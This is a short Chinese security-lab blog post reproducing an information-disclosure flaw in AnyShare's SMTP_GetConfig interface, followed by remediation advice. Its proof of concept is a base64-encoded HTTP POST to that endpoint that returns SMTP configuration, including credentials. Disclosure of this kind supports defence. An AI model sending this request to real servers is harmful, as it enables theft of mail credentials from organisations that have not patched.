#  【成功复现】爱数AnyShare SMTP_GetConfig 信息泄露漏洞   
奥村燐  弥天安全实验室   2025-01-06 04:18  
  
网安引领时代，弥天点亮未来 ****  
  
  
  
  
  
****  
  
****  
  
**0x00漏洞描述**  
  
  
  
**爱数AnyShare的SMTP_GetConfig接口存在信息泄露漏洞。攻击者可以通过该接口获取到敏感的配置信息，例如SMTP服务器的用户名和密码等。**  
  
****  
****  
  
**0x01影响范围**  
  
  
  
**我也不知道。**  
  
****  
  
****  
  
**0x02复现过程**  
  
  
****  
  
**POC**  
```
UE9TVCAvYXBpL1NoYXJlTWdudC9TTVRQX0dldENvbmZpZyBIVFRQLzEuMQpIb3N0OiB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHgKQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uCgp7fQ==
```  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hA4bUfHwjGiacWO2FqpNm1Ysq6D6OV6PjuFThNu6bJX6PHojUL3DOz57XzSalwc6XHgE3SDafDAgibQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
  
**0x03修复方案**  
  
  
  
**立即更新到最新版本的AnyShare，以确保所有已知的安全漏洞都已得到修复。**  
  
**检查并限制对SMTP_GetConfig接口的访问权限，确保只有授权用户才能访问。**  
  
**对SMTP服务进行加固，例如使用强密码策略，定期更换密码，并启用多因素认证。**  
  
**监控SMTP服务器的异常活动，如异常登录尝试或大量邮件发送。**  
  
**教育用户识别和防范钓鱼攻击，提高安全意识。**  
****  
  
  
 知识分享完了喜欢别忘了关注我们哦~学海浩茫，予以风动，必降弥天之润！   弥  天安全实验室  
  
  
